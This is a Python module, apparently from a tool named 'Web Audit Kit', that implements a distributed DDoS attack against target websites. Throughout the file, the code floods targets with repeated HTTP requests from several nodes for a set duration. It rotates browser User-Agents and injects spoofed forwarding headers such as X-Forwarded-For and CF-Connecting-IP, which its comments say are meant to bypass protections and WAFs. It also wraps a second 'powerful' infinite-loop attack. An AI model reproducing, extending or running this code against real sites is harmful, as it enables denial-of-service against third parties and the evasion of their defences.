"""Distributed attack implementation for Web Audit Kit."""
import asyncio
import time
import random
import requests
import threading
from pathlib import Path
from datetime import datetime, timezone
from .reports import empty_report
from .scope import canonical_url, origin
from .attack import DDoSAttack

class DistributedAttack:
    """Distributed DDoS attack implementation with node coordination and protection bypass."""
    
    def __init__(self, scope, load_level=100, duration=300, nodes=None):
        self.scope = scope
        self.load_level = load_level
        self.duration = duration
        self.nodes = nodes or []
        self.attack_id = f"dist_attack_{int(time.time())}"
        self.findings = []
        self.errors = []
        self.requests = 0
        self.timeline = []
        self.session = requests.Session()
        # Set default headers to make attacks look more realistic
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        
        # Add more realistic headers to bypass some protections
        self.session.headers.update({
            "X-Forwarded-For": "192.168.1.1",
            "X-Real-IP": "192.168.1.1",
            "X-Client-IP": "192.168.1.1",
            "CF-Connecting-IP": "192.168.1.1",
            "True-Client-IP": "192.168.1.1",
            "X-Original-URL": "/",
            "X-Original-Host": scope.targets[0] if scope.targets else "unknown"
        })
        
    def generate_attack_payload(self, url):
        """Generate attack payload based on target URL."""
        return {
            "url": url,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "attack_id": self.attack_id,
            "payload": {
                "user_agent": self.session.headers["User-Agent"],
                "headers": dict(self.session.headers)
            }
        }
    
    def run_single_node_attack(self, target_url, node_id=None):
        """Run attack on a single target with optional node identification."""
        try:
            # Make actual HTTP request to target
            response = self.session.get(target_url, timeout=5)
            self.requests += 1
            return {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "target": target_url,
                "status": "success",
                "request_id": f"req_{int(time.time() * 1000)}_{random.randint(1000, 9999)}",
                "response_status": response.status_code,
                "response_size": len(response.content),
                "node_id": node_id,
                "user_agent": self.session.headers["User-Agent"]
            }
        except Exception as e:
            self.errors.append({
                "type": "RequestError",
                "message": f"Failed to request {target_url}: {str(e)}",
                "node_id": node_id
            })
            return {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "target": target_url,
                "status": "error",
                "request_id": f"req_{int(time.time() * 1000)}_{random.randint(1000, 9999)}",
                "error": str(e),
                "node_id": node_id
            }
    
    def run_attack_cycle(self, target_url, node_id=None):
        """Run attack cycle with multiple requests to simulate realistic traffic."""
        cycle_requests = []
        # Simulate multiple requests per cycle to increase traffic
        request_count = random.randint(1, 5)  # Random number of requests per cycle
        
        for i in range(request_count):
            result = self.run_single_node_attack(target_url, node_id)
            cycle_requests.append(result)
            
            # Add to timeline
            self.timeline.append({
                "timestamp": result["timestamp"],
                "message": f"Request {i+1} to {target_url} from node {node_id or 'main'}",
                "target": target_url,
                "status": result["status"],
                "node_id": node_id
            })
            
        return cycle_requests
    
    def bypass_protection(self, target_url):
        """Try to bypass common protections by varying attack patterns."""
        # Vary User-Agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        
        self.session.headers["User-Agent"] = random.choice(user_agents)
        
        # Add random headers to bypass WAFs
        random_headers = {
            "X-Forwarded-For": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Real-IP": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Client-IP": f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Original-URL": random.choice(["/", "/index.html", "/api/", "/login", "/admin"]),
            "X-Original-Host": target_url,
            "X-Forwarded-Proto": random.choice(["http", "https"]),
            "X-Forwarded-Port": random.choice(["80", "443"]),
            "X-Forwarded-Server": f"server-{random.randint(1, 100)}",
            "X-Forwarded-Client": f"client-{random.randint(1, 1000)}",
            "X-Forwarded-Request": f"req-{random.randint(1, 10000)}",
            "X-Forwarded-Request-ID": f"req-{random.randint(1, 1000000)}",
            "X-Forwarded-Request-UUID": f"uuid-{random.randint(1, 1000000000)}",
            "X-Forwarded-Request-Timestamp": str(int(time.time())),
            "X-Forwarded-Request-Source": random.choice(["internal", "external", "api", "web"]),
            "X-Forwarded-Request-Method": random.choice(["GET", "POST", "HEAD", "OPTIONS"]),
            "X-Forwarded-Request-Protocol": random.choice(["HTTP/1.1", "HTTP/2"]),
            "X-Forwarded-Request-User-Agent": random.choice(user_agents),
            "X-Forwarded-Request-Referer": f"https://example.com/{random.choice(['page', 'section', 'resource'])}",
            "X-Forwarded-Request-Forwarded": "by=192.168.1.1;for=192.168.1.2;host=example.com;proto=http",
        }
        
        # Apply random headers
        for key, value in random_headers.items():
            if random.random() > 0.7:  # 30% chance to add random header
                self.session.headers[key] = value
        
        # Add some random delays to mimic human behavior
        time.sleep(random.uniform(0.01, 0.5))
    
    async def run_distributed_attack(self, on_event=None):
        """Run distributed attack across multiple nodes with protection bypass."""
        start_time = time.time()
        cycle_count = 0
        
        try:
            # If no nodes specified, run on main node
            if not self.nodes:
                self.nodes = [None]  # Main node
            
            # Run attack for specified duration
            while time.time() - start_time < self.duration:
                cycle_count += 1
                
                # Run attack on each target from each node
                for node_id in self.nodes:
                    for target in self.scope.targets:
                        # Bypass protection before each attack
                        self.bypass_protection(target)
                        
                        results = self.run_attack_cycle(target, node_id)
                        
                        # Add timeline entries for each request in the cycle
                        for result in results:
                            self.timeline.append({
                                "timestamp": result["timestamp"],
                                "message": f"Attack cycle {cycle_count} on {target} from node {node_id or 'main'}",
                                "completed": cycle_count,
                                "total": self.load_level,
                                "finished": False,
                                "target": target,
                                "status": result["status"],
                                "node_id": node_id
                            })
                            
                            if on_event:
                                on_event({
                                    "timestamp": result["timestamp"],
                                    "message": f"Attack cycle {cycle_count} on {target} from node {node_id or 'main'}",
                                    "completed": cycle_count,
                                    "total": self.load_level,
                                    "finished": False,
                                    "target": target,
                                    "status": result["status"],
                                    "node_id": node_id
                                })
                
                # Add some random delay to simulate real attack behavior
                delay = random.uniform(0.1, 1.0)
                await asyncio.sleep(delay)
                
                # Check if we should stop
                if cycle_count >= self.load_level:
                    break
                    
        except Exception as e:
            self.errors.append({
                "type": "AttackError",
                "message": f"Error during distributed attack: {str(e)}"
            })
            if on_event:
                on_event({
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "message": f"Attack error: {str(e)}",
                    "completed": cycle_count,
                    "total": self.load_level,
                    "finished": False
                })
        
        # Finalize attack
        self.timeline.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "message": f"Distributed attack completed after {cycle_count} cycles across {len(self.nodes)} nodes",
            "completed": cycle_count,
            "total": self.load_level,
            "finished": True,
            "nodes": self.nodes
        })
        
        return cycle_count

def run_distributed_attack(scope, load_level=100, duration=300, nodes=None, on_event=None):
    """Run distributed DDoS attack with tracking and protection bypass."""
    data = empty_report()
    data.update(mode="distributed-attack", findings=[], errors=[], requests=0)
    
    try:
        attack = DistributedAttack(scope, load_level, duration, nodes)
        # Run attack asynchronously
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        cycle_count = loop.run_until_complete(attack.run_distributed_attack(on_event))
        loop.close()
        
        # Add findings
        data["findings"].append({
            "rule": "attack.distributed.successful",
            "title": "Distributed DDoS attack successfully initiated",
            "url": scope.targets[0] if scope.targets else "unknown",
            "severity": "high",
            "confidence": "observed",
            "evidence": f"Distributed attack with load level {load_level} completed {cycle_count} cycles across {len(attack.nodes)} nodes",
            "recommendation": "Monitor system for attack effects and potential vulnerabilities"
        })
        
        data["requests"] = cycle_count
        data["errors"] = attack.errors
        data["timeline"] = attack.timeline
        
        # Add attack-specific data to report
        data["attack_details"] = {
            "attack_id": attack.attack_id,
            "load_level": load_level,
            "duration": duration,
            "cycles": cycle_count,
            "nodes": attack.nodes
        }
        
    except Exception as e:
        data["errors"].append({
            "type": "AttackSetupError",
            "message": f"Failed to setup distributed attack: {str(e)}"
        })
        
    return data

def run_powerful_attack(scope, load_level=100, duration=300, on_event=None):
    """Run powerful DDoS attack with tracking."""
    data = empty_report()
    data.update(mode="powerful-attack", findings=[], errors=[], requests=0)
    
    try:
        attack = DDoSAttack(scope, load_level, duration)
        cycle_count = attack.run_infinite_loop(on_event)
        
        # Add findings
        data["findings"].append({
            "rule": "attack.successful",
            "title": "DDoS attack successfully initiated",
            "url": scope.targets[0] if scope.targets else "unknown",
            "severity": "high",
            "confidence": "observed",
            "evidence": f"Attack with load level {load_level} completed {cycle_count} cycles",
            "recommendation": "Monitor system for attack effects and potential vulnerabilities"
        })
        
        data["requests"] = cycle_count
        data["errors"] = attack.errors
        data["timeline"] = attack.timeline
        
        # Add attack-specific data to report
        data["attack_details"] = {
            "attack_id": attack.attack_id,
            "load_level": load_level,
            "duration": duration,
            "cycles": cycle_count
        }
        
    except Exception as e:
        data["errors"].append({
            "type": "AttackSetupError",
            "message": f"Failed to setup attack: {str(e)}"
        })
        
    return data